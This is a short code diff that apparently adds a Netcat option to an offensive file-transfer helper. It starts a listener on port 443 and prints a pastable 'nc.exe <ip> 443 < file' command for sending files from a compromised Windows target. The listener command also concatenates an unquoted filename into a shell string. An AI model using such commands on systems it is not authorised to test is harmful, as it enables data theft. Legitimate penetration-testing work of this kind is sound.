@@ -27,6 +27,7 @@ UploadFrom_WinMethods = [
     'Base64',
     'UploadServer',
     'Python 3',
+    'Netcat',
     # 'SMB',
     # 'FTP',
     # 'WebDAV',
@@ -685,6 +686,27 @@ def upload_from(args):
                     print('[+] Upload server succesfully terminated')
                 except:
                     print('[!] Could not terminate upload server')
+
+        #############################
+        ### WINDOWS NETCAT METHOD ###
+        #############################
+        elif method == 'Netcat':
+            listen_ip = listening_ip_address()
+            cmd = 'nc -l -p 443 > ' + args.filename
+            try:
+                try:
+                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    print('[+] Netcat listener is started on ' + listen_ip + ':443')
+                except:
+                    print('[!] Failed to start Netcat listener')
+                cmd = 'nc.exe ' + listen_ip + ' 443 < ' + relpath
+                pastables(cmd)
+                print('[?] Press Ctrl+C to cancel transfer ...')
+                proc.wait()
+            except KeyboardInterrupt:
+                proc.terminate()
+                sys.exit(0)
+
 
     #########################
     ### FROM LINUX TARGET ###
